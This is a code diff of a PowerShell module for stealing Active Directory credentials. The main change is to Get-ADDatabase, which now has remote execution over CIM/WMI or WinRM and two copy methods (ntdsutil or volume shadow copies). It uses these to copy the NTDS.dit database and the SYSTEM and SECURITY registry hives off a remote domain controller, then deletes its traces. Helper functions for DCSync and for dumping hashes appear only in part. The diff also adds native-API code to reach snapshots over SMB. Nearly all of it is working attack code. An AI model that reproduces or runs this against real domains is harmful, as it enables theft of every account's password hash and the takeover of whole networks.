@@ -1,3 +1,5 @@
+#requires -version 3
+
 function Invoke-DCSync {
 <#
 .SYNOPSIS
@@ -47,7 +49,7 @@ function Invoke-DCSync {
     # Check if DSInternals module is installed
     if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
         Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
-        Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
+        Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
         return
     }
     else {
@@ -110,22 +112,27 @@ function Get-ADDatabase {
 
 .DESCRIPTION
     Get-ADDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.
-    The ntdsutil command is launch through WMI in case of Windows 2008 or later, otherwise WMI Volume Shadow Copy method is used.
 
 .PARAMETER Server
     Specifies the target domain controller.
 
-.PARAMETER TargetDirectory
-    Specifies the target directory for local copy.
-
 .PARAMETER Credential
     Specifies the privileged account to use (typically Domain Admin).
 
-.EXAMPLE
-    PS C:\> Get-ADDatabase
+.PARAMETER Protocol
+    Specifies the transport protocol to use, defaults to 'Dcom'.
+
+.PARAMETER Method
+    Specifies the copy method to use, defaults to 'ShadowCopy'.
+
+.PARAMETER TargetDirectory
+    Specifies the target directory for local copy.
 
 .EXAMPLE
-    PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
+    PS C:\> Get-ADDatabase -TargetDirectory $Env:TEMP
+
+.EXAMPLE
+    PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Protocol Wsman -Method NtdsUtil
 #>
     Param (
         [ValidateNotNullOrEmpty()]
@@ -133,83 +140,217 @@ function Get-ADDatabase {
         $Server = $env:LOGONSERVER,
 
         [ValidateNotNullOrEmpty()]
-        [String]
-        $TargetDirectory = ".",
-
-        [ValidateNotNullOrEmpty()]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
+        $Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('Dcom', 'Wsman')]
+        [String]
+        $Protocol = 'Dcom',
+
+        [ValidateSet('NtdsUtil', 'ShadowCopy')]
+        [String]
+        $Method = 'ShadowCopy',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TargetDirectory = "."
     )
 
-    # Identify the operating system version
-    Write-Host "[*] Identifying the operating system version of $Server"
-    try {
-        $OS = Get-WmiObject Win32_OperatingSystem -ComputerName $Server -Credential $Credential
-    }
-    catch {
-        Write-Warning $_
-        return
-    }
-
-    # Map a drive to the domain controller and create a temporary directory
-    New-PSDrive -Name "S" -Root "\\$Server\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
-    New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null
-
-    # If the operating system is Windows 2008 or later
-    if ($OS.Version[0] -ge 6) {
-        Write-Host "[*] Creating NTDS copy using ntdsutil"
-        $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "ac in ntds" i "cr fu C:\Windows\Temp\dump" q q' -ComputerName $Server -Credential $Credential
-        do {
-            Start-Sleep -m 250
+    BEGIN {
+        $cimOption = New-CimSessionOption -Protocol $Protocol
+        $psOption = New-PSSessionOption -NoMachineProfile
+        if ($Credential.Username) {
+            $cimSession = New-CimSession -ComputerName $Server -Credential $Credential -SessionOption $cimOption -ErrorAction Stop
+            if ($Protocol -eq 'Wsman') {
+                $psSession = New-PSSession -ComputerName $Server -Credential $Credential -SessionOption $psOption
+            }
         }
-        until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
-
-        # Copy the ntds.dit file and registry hives locally
-        Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
-        Copy-Item 'S:\Windows\Temp\dump\Active Directory\ntds.dit' $TargetDirectory
-        Copy-Item 'S:\Windows\Temp\dump\registry\SECURITY' $TargetDirectory
-        Copy-Item 'S:\Windows\Temp\dump\registry\SYSTEM' $TargetDirectory
-    }
-
-    # If the operating system is Windows 2003
-    else {
-        # Grab the location of the ntds.dit file on the remote domain controller
-        $Hive = [uint32]2147483650
-        $Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
-        $Value = "DSA Database File"
-        $DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $Server -Credential $Credential).sValue
-        $DitDrive = $DitPath.Split("\")[0]
-        $DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"
-
-        # Create a shadow copy of the corresponding drive
-        Write-Host "[*] Creating a shadow copy"
-        $Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $Server -Credential $Credential
-        $ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $Server -Credential $Credential
-        $DeviceObject = $ShadowCopy.DeviceObject.ToString()
-
-        # Copy the ntds.dit file and SYSTEM hive from the shadow copy
-        $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $Server -Credential $Credential
-        do {
-            Start-Sleep -m 250
+        else {
+            $cimSession = New-CimSession -ComputerName $Server -SessionOption $cimOption -ErrorAction Stop
+            if ($Protocol -eq 'Wsman') {
+                $psSession = New-PSSession -ComputerName $Server -SessionOption $psOption
+            }
         }
-        until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
-
-        # Delete the shadow copy
-        (Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $Server -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()
-
-        # Copy the ntds.dit file and registry hives locally
-        Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
-        Copy-Item 'S:\Windows\Temp\dump\ntds.dit' $TargetDirectory
-        Copy-Item 'S:\Windows\Temp\dump\edb.log' $TargetDirectory
-        Copy-Item 'S:\Windows\Temp\dump\SYSTEM' $TargetDirectory
-        Copy-Item 'S:\Windows\Temp\dump\SECURITY' $TargetDirectory
     }
 
-    # Delete the temporary directory
-    Write-Host "[*] Cleaning up remote temporary files"
-    Remove-Item 'S:\Windows\Temp\dump' -Recurse
-    Remove-PSDrive S
+    PROCESS {
+
+        if ($Method -eq 'NtdsUtil') {
+            Write-Host "[*] Identifying the operating system version of $Server"
+            $OS = Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $cimSession
+            if ($OS.Version[0] -lt 6) {
+                Write-Host "[-] Copy method not supported by the target host"
+                return
+            }
+
+            Write-Host "[*] Creating NTDS copy using ntdsutil.exe"
+            $tempDir = "C:\Windows\Temp\dump"
+            $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c ntdsutil `"ac in ntds`" i `"cr fu $tempDir`" q q"} -CimSession $cimSession
+            do {
+                Start-Sleep -m 250
+            }
+            until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+
+            Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
+            if ($Protocol -eq 'Wsman') {
+                # Download files via PSRemoting
+                Copy-Item -Recurse -Path "$tempDir" -Destination "$TargetDirectory" -FromSession $psSession
+            }
+            else {
+                # Download files via SMB
+                $remoteDir = "\\$Server\$($tempDir -Replace ":","$")"
+                Copy-Item -Recurse -Path "$remoteDir" -Destination "$TargetDirectory" -Credential $Credential
+            }
+
+            # Delete the temporary directory
+            Write-Host "[*] Cleaning up remote file copies"
+            Get-CimInstance -ClassName Win32_Directory -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
+        }
+        else {
+            Write-Host "[*] Grabbing the location of the ntds.dit file on $Server"
+            $HKLM = [uint32]2147483650
+            $key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
+            $value = "DSA Database File"
+            $ditPath = (Invoke-CimMethod -ClassName StdRegProv -Name GetStringValue -Arguments @{hDefKey=$HKLM; sSubKeyName=$key; sValueName=$value} -CimSession $cimSession).sValue
+            $ditRelativePath = $ditPath.Split('\')[1..($ditPath.Split('\').Length - 1)] -Join '\'
+            $edbRelativePath = "$($ditPath.Split('\')[1..($ditPath.Split('\').Length - 2)] -Join '\')\edb.log"
+            $ditDrive = $ditPath.Split("\")[0]
+
+            # Create a shadow copy of the corresponding drive
+            Write-Host "[*] Creating a shadow copy of volume '$ditDrive\'"
+            $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="$ditDrive\"} -CimSession $cimSession
+            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession
+
+            Write-Host "[*] Copying the NTDS file into $(Resolve-Path $TargetDirectory)"
+            if ($Protocol -eq 'Wsman') {
+                $deviceObject = $shadowCopy.DeviceObject.ToString()
+                $tempDir = "C:\Windows\Temp\dump"
+                $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink `"$tempDir`" `"$deviceObject`""} -CimSession $cimSession
+                do {
+                    Start-Sleep -m 250
+                }
+                until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+
+                # Download files via PSRemoting
+                $ditBackupPath = "$tempDir\$ditRelativePath"
+                $edbBackupPath = "$tempDir\$edbRelativePath"
+                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+            }
+            else {
+                # Adapted from https://gist.github.com/jborean93/f60da33b08f8e1d5e0ef545b0a4698a0
+                # Create a SafeFileHandle of the UNC path
+                $handle = [Win32]::CreateFileW(
+                    "\\$Server\$($ditDrive -Replace ':','$')",
+                    [System.Security.AccessControl.FileSystemRights]"ListDirectory",
+                    [System.IO.FileShare]::ReadWrite,
+                    [System.IntPtr]::Zero,
+                    [System.IO.FileMode]::Open,
+                    0x02000000,
+                    [System.IntPtr]::Zero
+                )
+                if ($handle.IsInvalid) {
+                    Write-Error -Message "CreateFileW failed"
+                }
+                # Invoke NtFsControlFile to access the snapshots
+                $transDataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                $bufferSize = $transDataSize + 4
+                $outBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
+                $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
+                [Win32]::NtFsControlFile($handle, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [System.IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+
+                # Download files via SMB
+                $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
+                $ditBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$ditRelativePath"
+                $edbBackupPath = "\\$Server\$($ditDrive -Replace ':', '$')\$shadowPath\$edbRelativePath"
+                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+            }
+
+            if ($ditDrive -ne 'C:') {
+                if ($Protocol -eq 'Wsman') {
+                    # Delete the previous shadow link
+                    Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
+                }
+                else {
+                    # Close the previous handle
+                    $handle.Dispose()
+                }
+
+                # Delete the previous shadow copy
+                $shadowCopy | Remove-CimInstance
+
+                Write-Host "[*] Creating a shadow copy of volume 'C:\'"
+                $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession
+                $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession
+
+                if ($Protocol -eq 'Wsman') {
+                    $deviceObject = $shadowCopy.DeviceObject.ToString()
+                    $tempDir = "C:\Windows\Temp\dump"
+                    $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink $tempDir $deviceObject"} -CimSession $cimSession
+                    do {
+                        Start-Sleep -m 250
+                    }
+                    until ((Get-CimInstance -ClassName Win32_process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+                }
+                else {
+                    # Create a SafeFileHandle of the UNC path
+                    $handle = [Win32]::CreateFileW(
+                        "\\$Server\C`$",
+                        [System.Security.AccessControl.FileSystemRights]"ListDirectory",
+                        [System.IO.FileShare]::ReadWrite,
+                        [System.IntPtr]::Zero,
+                        [System.IO.FileMode]::Open,
+                        0x02000000,
+                        [System.IntPtr]::Zero
+                    )
+                    if ($handle.IsInvalid) {
+                        Write-Error -Message "CreateFileW failed"
+                    }
+                    # Invoke NtFsControlFile to access the snapshots
+                    $transDataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                    $bufferSize = $transDataSize + 4
+                    $outBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
+                    $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
+                    [Win32]::NtFsControlFile($handle, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [System.IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+                }
+            }
+
+            Write-Host "[*] Copying the registry hives into $(Resolve-Path $TargetDirectory)"
+            if ($Protocol -eq 'Wsman') {
+                # Download files via PSRemoting
+                $ditBackupPath = "$tempDir\Windows\System32\config\SYSTEM"
+                $edbBackupPath = "$tempDir\Windows\System32\config\SECURITY"
+                Copy-Item -Path "$ditBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+                Copy-Item -Path "$edbBackupPath" -Destination "$TargetDirectory" -FromSession $psSession
+
+                # Delete the shadow link
+                Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession | Remove-CimInstance
+            }
+            else {
+                # Download files via SMB
+                $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
+                $systemBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SYSTEM"
+                $securityBackupPath = "\\$Server\C$\$shadowPath\Windows\System32\config\SECURITY"
+                Copy-Item -Path "$systemBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+                Copy-Item -Path "$securityBackupPath" -Destination "$TargetDirectory" -Credential $Credential
+
+                # Close the handle
+                $handle.Dispose()
+            }
+
+            Write-Host "[*] Cleaning up the shadow copy"
+            $shadowCopy | Remove-CimInstance
+        }
+    }
+
+    END {
+        Remove-CimSession -CimSession $cimSession
+        if ($Protocol -eq 'Wsman') {
+            Remove-PSSession -Session $psSession
+        }
+    }
 }
 
 function Dump-ADDatabase {
@@ -260,7 +401,7 @@ function Dump-ADDatabase {
     # Check if DSInternals module is installed
     if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
         Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
-        Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
+        Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
         return
     }
     else {
@@ -329,7 +470,7 @@ function Mount-ADDatabase {
         $AllowUpgrade = $false,
 
         [ValidateRange(1025,65535)]
-        [int]
+        [Int32]
         $LdapPort = 3266
     )
 
@@ -450,3 +591,53 @@ function Invoke-LdapSearch {
         Write-Warning "$_"
     }
 }
+
+$source = @"
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+
+public class Win32
+{
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IO_STATUS_BLOCK
+    {
+        public UInt32 Status;
+        public UInt32 Information;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct NT_Trans_Data
+    {
+        public UInt32 NumberOfSnapShots;
+        public UInt32 NumberOfSnapShotsReturned;
+        public UInt32 SnapShotArraySize;
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern SafeFileHandle CreateFileW(
+        string lpFileName,
+        FileSystemRights dwDesiredAccess,
+        FileShare dwShareMode,
+        IntPtr lpSecurityAttributes,
+        FileMode dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+
+    [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern UInt32 NtFsControlFile(
+        SafeFileHandle hDevice,
+        IntPtr Event,
+        IntPtr ApcRoutine,
+        IntPtr ApcContext,
+        ref IO_STATUS_BLOCK IoStatusBlock,
+        UInt32 FsControlCode,
+        IntPtr InputBuffer,
+        UInt32 InputBufferLength,
+        IntPtr OutputBuffer,
+        UInt32 OutputBufferLength);
+}
+"@
+Add-Type -TypeDefinition $source
